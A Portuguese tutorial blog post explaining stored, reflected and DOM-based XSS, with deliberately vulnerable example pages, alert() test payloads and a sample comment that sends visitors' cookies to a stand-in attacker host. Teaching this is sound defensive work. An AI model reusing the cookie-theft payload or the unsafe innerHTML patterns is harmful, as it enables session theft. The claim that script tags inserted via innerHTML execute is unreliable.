---
layout: post
title: "Entendendo o XSS (Cross-Site Scripting): Conceitos e Exemplos"
date: 2023-05-02 23:48:46 -0300
categories: Segurança Programação Vulnerabilidades XSS
---

Olá! Neste post, vamos discutir o conceito de **Cross-Site Scripting (XSS)** e ver alguns exemplos que ilustram essa vulnerabilidade comum em aplicações web. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.

## O que é XSS?

Cross-Site Scripting (XSS) é uma vulnerabilidade de segurança que permite que um atacante injete código malicioso, geralmente scripts JavaScript, em páginas web visualizadas por outros usuários. Esses scripts podem acessar informações confidenciais, como cookies e tokens de sessão, ou até mesmo executar ações em nome da vítima.

## Tipos de XSS

Existem três tipos principais de XSS:

1. **XSS Persistente (Stored XSS)**: Ocorre quando o código malicioso é armazenado permanentemente em um servidor, geralmente em bancos de dados ou arquivos. Quando outros usuários acessam a página afetada, o script é executado em seus navegadores.
2. **XSS Refletido (Reflected XSS)**: Ocorre quando o código malicioso é injetado por meio de parâmetros GET ou POST e é imediatamente refletido na resposta do servidor. Geralmente, o atacante induz a vítima a clicar em um link malicioso que contém o código.
3. **XSS Baseado em DOM (DOM-Based XSS)**: Ocorre quando o código malicioso é injetado no Document Object Model (DOM) de uma página sem a necessidade de interação com o servidor. Esse tipo de XSS explora falhas no código JavaScript do lado do cliente.

## Exemplo de XSS Refletido

Vamos considerar um exemplo simples de XSS Refletido:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Exemplo de XSS Refletido</title>
</head>
<body>
    <h1>Resultado da Pesquisa:</h1>
    <div id="result"></div>
    <script>
        let searchQuery = new URLSearchParams(window.location.search).get('q');
        document.getElementById('result').innerHTML = 'Você pesquisou: ' + searchQuery;
    </script>
</body>
</html>
```

Neste exemplo, o script JavaScript insere o valor do parâmetro `q` diretamente no elemento HTML. Se um atacante criar um link como `https://example.com/search?q=<script>alert('XSS')</script>`, o script malicioso será executado no navegador do usuário.

## Exemplo de XSS Persistente

Suponha que temos um fórum onde os usuários podem postar comentários. Um exemplo de XSS Persistente pode ocorrer se o aplicativo não sanitizar corretamente as entradas dos usuários antes de armazená-las no banco de dados. Um atacante pode enviar um comentário contendo um script malicioso, como:

```js
Olá, pessoal! <script>document.location='http://malicious.example.com/steal?cookie=' + document.cookie;</script>
```

Quando outros usuários visualizarem esse comentário, o script malicioso será executado em seus navegadores, podendo roubar seus cookies e enviá-los para o site malicioso.

## Exemplo de XSS Baseado em DOM

Considere o seguinte exemplo de uma página que usa o DOM para exibir o resultado de uma pesquisa:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Exemplo de XSS Baseado em DOM</title>
</head>
<body>
    <h1>Resultado da Pesquisa:</h1>
    <div id="result"></div>
    <script>
        let searchQuery = document.location.hash.substring(1);
        document.getElementById('result').innerHTML = 'Você pesquisou: ' + decodeURIComponent(searchQuery);
    </script>
</body>
</html>
```

Neste exemplo, o script JavaScript lê o valor da pesquisa diretamente do fragmento da URL (parte após o símbolo "#") e insere-o no elemento HTML. Se um atacante criar um link como https://example.com/search#<script>alert('XSS')</script>, o navegador da vítima executará o script malicioso ao acessar o link.

## Conclusão

O Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns em aplicações web. Para proteger seu site contra ataques de XSS, é importante seguir boas práticas de segurança, como a sanitização adequada das entradas dos usuários e a validação das entradas do lado do cliente e do servidor.

Também é essencial usar políticas de segurança de conteúdo (Content Security Policy - CSP) para limitar a execução de scripts de origens não confiáveis e impedir a exploração de vulnerabilidades XSS. Além disso, é importante manter-se atualizado sobre as últimas tendências e técnicas de ataque para garantir a segurança contínua de sua aplicação web.

Ao adotar essas práticas e conscientizar-se das diferentes formas de XSS, como XSS Persistente, XSS Refletido e XSS Baseado em DOM, você estará mais bem preparado para identificar e mitigar possíveis vulnerabilidades em seu site ou aplicação web.
